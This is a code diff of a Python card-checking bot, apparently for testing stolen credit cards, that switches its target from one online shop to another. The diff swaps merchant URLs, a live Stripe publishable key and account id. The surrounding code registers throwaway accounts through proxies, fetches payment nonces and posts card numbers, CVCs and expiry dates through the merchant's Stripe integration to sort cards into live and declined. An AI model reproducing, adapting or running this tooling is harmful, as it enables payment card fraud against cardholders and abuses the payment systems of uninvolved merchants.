@@ -167,7 +167,7 @@ def create_new_account(session, proxy_str):
         proxies = parse_proxy(proxy_str) if proxy_str else None
         
         login_page_res = session.get(
-            'https://chiwahwah.co.nz/my-account/', 
+            'https://iconichairproducts.com/my-account/', 
             proxies=proxies, 
             timeout=30,
             verify=False
@@ -186,7 +186,7 @@ def create_new_account(session, proxy_str):
         }
         
         reg_response = session.post(
-            'https://chiwahwah.co.nz/my-account/', 
+            'https://iconichairproducts.com/my-account/', 
             data=register_data, 
             proxies=proxies, 
             timeout=30, 
@@ -206,7 +206,7 @@ def get_payment_nonce(session, proxy_str):
         proxies = parse_proxy(proxy_str) if proxy_str else None
         
         payment_page_res = session.get(
-            'https://chiwahwah.co.nz/my-account/add-payment-method/', 
+            'https://iconichairproducts.com/my-account/add-payment-method/', 
             proxies=proxies, 
             timeout=30,
             verify=False
@@ -250,7 +250,7 @@ def get_3ds_challenge_mandated(website_response, proxy_str):
                         'one_click_authn_device_support[spc_eligible]': 'true',
                         'one_click_authn_device_support[webauthn_eligible]': 'true',
                         'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
-                        'key': 'pk_live_51DgigaKtGTyFuugJaS4msof6hjcWMac1YkqEYjZ1yMSY4KAld2GjRHPd73gw5d0n1T2Sf30fMORdakP6mcweVGGX00JDPQfb3V',
+                        'key': 'pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs',
                         '_stripe_version': '2024-06-20'
                     }
                     
@@ -486,7 +486,7 @@ DECLINED CC ❌
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-            data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=NZ&pasted_fields=number&payment_user_agent=stripe.js%2F8c194b4c2c%3B+stripe-js-v3%2F8c194b4c2c%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fchiwahwah.co.nz&time_on_page=28795&client_attribution_metadata[client_session_id]=3f796864-d6bb-4393-9bf5-1a636002265e&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=83d7bd43-736e-47d7-96e1-01b6198c3e9b&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=12f852aa-7a80-4901-b475-1aac8c8c8e0d91fe6b&muid=553107c9-add7-4312-adb4-7152c1efbe7f4f94b1&sid=0176bfd9-9715-400f-b69d-02037e488528dc3434&key=pk_live_51DgigaKtGTyFuugJaS4msof6hjcWMac1YkqEYjZ1yMSY4KAld2GjRHPd73gw5d0n1T2Sf30fMORdakP6mcweVGGX00JDPQfb3V&_stripe_version=2024-06-20'
+            data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=ZW&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ficonichairproducts.com&time_on_page=16895&client_attribution_metadata[client_session_id]=c65d6fd3-7d50-4c54-b2e6-34fe77e1073b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=367fc65f-6f9a-4c40-a8d6-69321b5b3c5b&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=c1b5ef95-6071-4458-8290-e26d5d281f411dd579&muid=22345302-2026-4f20-a205-f2be8657a6e69a71f8&sid=88b29ca2-4061-4ef8-a5db-d6a159a5980dfcba85&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1JmxDb2Hh2LP7rQY'
 
             proxies = parse_proxy(proxy_str) if proxy_str else None
             response = requests.post(
@@ -506,9 +506,9 @@ DECLINED CC ❌
                     'accept': '*/*',
                     'accept-language': 'en-US,en;q=0.6',
                     'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                    'origin': 'https://chiwahwah.co.nz',
+                    'origin': 'https://iconichairproducts.com',
                     'priority': 'u=1, i',
-                    'referer': 'https://chiwahwah.co.nz/my-account/add-payment-method/',
+                    'referer': 'https://iconichairproducts.com/my-account/add-payment-method/',
                     'sec-ch-ua': '"Brave";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
                     'sec-ch-ua-mobile': '?0',
                     'sec-ch-ua-platform': '"Windows"',
@@ -528,7 +528,7 @@ DECLINED CC ❌
                 }
 
                 response2 = session.post(
-                    'https://chiwahwah.co.nz/wp-admin/admin-ajax.php', 
+                    'https://iconichairproducts.com/wp-admin/admin-ajax.php', 
                     headers=headers2, 
                     data=data2, 
                     proxies=proxies, 
